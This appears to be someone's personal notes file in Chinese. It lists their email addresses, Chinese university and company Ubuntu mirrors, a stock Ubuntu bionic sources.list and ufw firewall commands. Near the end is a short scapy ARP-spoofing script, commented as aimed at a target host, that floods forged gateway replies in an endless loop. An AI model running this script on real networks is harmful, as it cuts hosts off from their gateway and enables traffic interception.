<a

LY_Ayase@outlook.jp
LY_Ayase@yahoo.co.jp
LY_Ayase@yeah.net
LY_Ayase@163.com
LY_Ayase@126.com
lian.ayase@gmail.com
admin@ayase.site	




Boss直聘 
前程无忧
智联招聘
拉勾


	/etc/apt/sources.list


高校镜像源

	 --------------------------有粗略容量------------------------------

	清华大学开源镜像站 （当前已用容量估计：5.67T）
		https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/

	中国科技大学开源镜像站（当前已用容量估计：5.67T
		https://mirrors.ustc.edu.cn/repogen/

	吉林大学开源镜像站（当前已用容量估计：5.67T）
		http://mirrors.jlu.edu.cn/

	大连东软信息学院（当前已用容量估计：2.5T）
		http://mirrors.neusoft.edu.cn/

	重庆大学（当前已用容量估计：3.93T）
		http://mirrors.cqu.edu.cn/

	西北农林科技大学（只收录CentOS镜像，当前已用容量估计：140GB）
		http://mirrors.nwsuaf.edu.cn/

	重庆邮电大学（当前已用容量估计：1.68T）
		http://mirrors.cqupt.edu.cn/

	 --------------------------教育網出口------------------------------

	华中科技大学（华中地区教育网出口，当前已用容量估计：4.83T）
		http://mirror.hust.edu.cn/

	大连理工大学（大连地区教育网出口）
		http://mirror.dlut.edu.cn/

	上海交通大学（华东南地区教育网出口）
		http://ftp.sjtu.edu.cn/
		ftp://ftp.sjtu.edu.cn/

	东北大学（东北地区教育网出口）
		http://mirror.neu.edu.cn/

	西安交通大学（西北地区教育网出口）
		http://mirrors.xjtu.edu.cn/

	 --------------------------僅供內部使用------------------------------

	天津大学（镜像仅供校内使用，另一域名为zyrj.org）
		http://mirror.tju.edu.cn

	南京师范大学（镜像仅供校内使用）
		http://mirrors.njnu.edu.cn/

	中央音乐学院（镜像仅供校内使用）
		http://fundawang.lcuc.org.cn/

	西安电子科技大学（镜像仅供校内使用）
		http://linux.xidian.edu.cn/
		http://xdlinux.info/

	南开大学（镜像仅供校内使用）
		http://ftp.nankai.edu.cn

	 --------------------------普通------------------------------

	北京交通大学
		http://mirror.bjtu.edu.cn/

	北京理工大学
		http://mirror.bit.edu.cn/web/

	兰州大学
		http://mirror.lzu.edu.cn/

	浙江大学
		http://mirrors.zju.edu.cn/

	厦门大学
		http://mirrors.xmu.edu.cn/

	中山大学
		http://mirror.sysu.edu.cn/

	南阳理工学院
		http://mirror.nyist.edu.cn/
	郑州大学
		https://mirrors.zzu.edu.cn/

	南京信息工程大学
		http://mirrors.duohuo.org/

	江苏广播电视大学
		http://mirrors.jstvu.edu.cn/

	山东女子学院
		http://mirrors.sdwu.edu.cn/

	上海科技大学
		https://mirrors.geekpie.org/

	南京信息职业技术学院
		https://mirrors.njcit.cn/

	上海交通大学SJTUG
		http://mirrors.sjtug.org/

	南京邮电大学通达学院
		http://mirrors.tdsast.cn/

	燕山大学
		http://mirror.pret-page.com/

	南京邮电大学
		http://mirrors.njupt.edu.cn/

	南京大学
		http://mirrors.nju.edu.cn/

	 --------------------------特殊------------------------------ 

	电子科技大学（西南地区教育网出口西南，首页近一年无人维护，内容可访问）
		http://ubuntu.uestc.edu.cn/

	云南大学
		http://archive.ubuntu.mirrors.opensource.ynu.edu.cn/（收录ubuntu软件源）
		http://pypi.opensource.ynu.edu.cn/（收录pypi）

	中科院高能物理研究所
		http://mirror.ihep.ac.cn/
		http://mir-cern.ihep.ac.cn/

	电子科技大学凝聚网络安全工作室
		http://mirrors.cnssuestc.org/





企业镜像源


	首都在线科技股份有限公司
		http://mirrors.yun-idc.com/

	阿里云开源镜像站 （部分镜像同步延迟超过1天）
		https://opsx.alibaba.com/mirror

	网易开源镜像站
		http://mirrors.163.com/.help/ubuntu.html

	搜狐开源镜像站	(Ubuntu旧发行版同步被冻结，不同步Ubuntu新发行版，Ubuntu源同步正常）
		http://mirrors.sohu.com/










--------------------------------原始文件-----------------------------------------





## Note, this file is written by cloud-init on first boot of an instance
## modifications made here will not survive a re-bundle.
## if you wish to make changes you can:
## a.) add 'apt_preserve_sources_list: true' to /etc/cloud/cloud.cfg
##     or do the same in user-data
## b.) add sources in /etc/apt/sources.list.d
## c.) make changes to template file /etc/cloud/templates/sources.list.tmpl

# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to
# newer versions of the distribution.
deb http://archive.ubuntu.com/ubuntu bionic main restricted
deb-src http://archive.ubuntu.com/ubuntu bionic main restricted

## Major bug fix updates produced after the final release of the
## distribution.
deb http://archive.ubuntu.com/ubuntu bionic-updates main restricted
deb-src http://archive.ubuntu.com/ubuntu bionic-updates main restricted

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team. Also, please note that software in universe WILL NOT receive any
## review or updates from the Ubuntu security team.
deb http://archive.ubuntu.com/ubuntu bionic universe
deb-src http://archive.ubuntu.com/ubuntu bionic universe
deb http://archive.ubuntu.com/ubuntu bionic-updates universe
deb-src http://archive.ubuntu.com/ubuntu bionic-updates universe

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team, and may not be under a free licence. Please satisfy yourself as to
## your rights to use the software. Also, please note that software in
## multiverse WILL NOT receive any review or updates from the Ubuntu
## security team.
deb http://archive.ubuntu.com/ubuntu bionic multiverse
deb-src http://archive.ubuntu.com/ubuntu bionic multiverse
deb http://archive.ubuntu.com/ubuntu bionic-updates multiverse
deb-src http://archive.ubuntu.com/ubuntu bionic-updates multiverse

## N.B. software from this repository may not have been tested as
## extensively as that contained in the main release, although it includes
## newer versions of some applications which may provide useful features.
## Also, please note that software in backports WILL NOT receive any review
## or updates from the Ubuntu security team.
deb http://archive.ubuntu.com/ubuntu bionic-backports main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu bionic-backports main restricted universe multiverse

deb http://security.ubuntu.com/ubuntu bionic-security main restricted
deb-src http://security.ubuntu.com/ubuntu bionic-security main restricted
deb http://security.ubuntu.com/ubuntu bionic-security universe
deb-src http://security.ubuntu.com/ubuntu bionic-security universe
deb http://security.ubuntu.com/ubuntu bionic-security multiverse
deb-src http://security.ubuntu.com/ubuntu bionic-security multiverse

## Uncomment the following two lines to add software from Canonical's
## 'partner' repository.
## This software is not part of Ubuntu, but is offered by Canonical and the
## respective vendors as a service to Ubuntu users.
# deb http://archive.canonical.com/ubuntu bionic partner
# deb-src http://archive.canonical.com/ubuntu bionic partner



--------------------------------原始文件-----------------------------------------



--------------------------------GFW-----------------------------------------


sudo ufw enable
啟用

sudo ufw default deny
開機啟用

sudo ufw status
查看當前狀態

sudo ufw status numbered
查看當前已經啟用的端口

sudo ufw allow [service]
開啟某個服務端口

sudo ufw logging off
開啟記錄日誌

sudo ufw default deny incoming
開啟默認策略   //默認拒絕傳入，允許傳出	

sudo ufw allow 1000:2000/tcp
開啟特定端口範圍連接

sudo ufw allow from 111.111.111.111
開啟特定IP所有端口的连接

sudo ufw allow from 111.111.111.111 to any port 22
開啟特定IP特定端口的连接



sudo ufw disable
關閉

sudo ufw deny [service]
關閉某個服務端口

sudo ufw logging off
關閉記錄日誌

sudo ufw default allow outgoing
關閉默認策略	//允許一切傳輸

sudo ufw deny http
關閉http连接

sudo ufw deny from 111.111.111.111
關閉特定IP连接







localhost (10.11.63.199) at 00:1c:25:9c:ad:f2 [ether] on enp3s0
localhost (10.11.63.1) at 4c:5e:0c:b1:0c:01 [ether] on enp3s0

sudo scapy
p199 = Ether()/ARP()//构造一个包
p199.hwdst = '28:D2:44:E2:6B:C3' //要攻击的主机mac地址
p199.pdst = '10.11.63.191'  //要攻击的主机的ip
p199.psrc = '10.11.63.1'   //网关ip
p199.hwsrc = 'aa:aa:aa:aa:aa:aa'  //随便写个mac地址
while 1: sendp(p199,inter=0.005,count=9999)//无限发送，按Ctrl+z停止发送
目前已經使用 p199 











id	int(11)			
username	varchar(255)			
password	varchar(32)			
authority	int(1)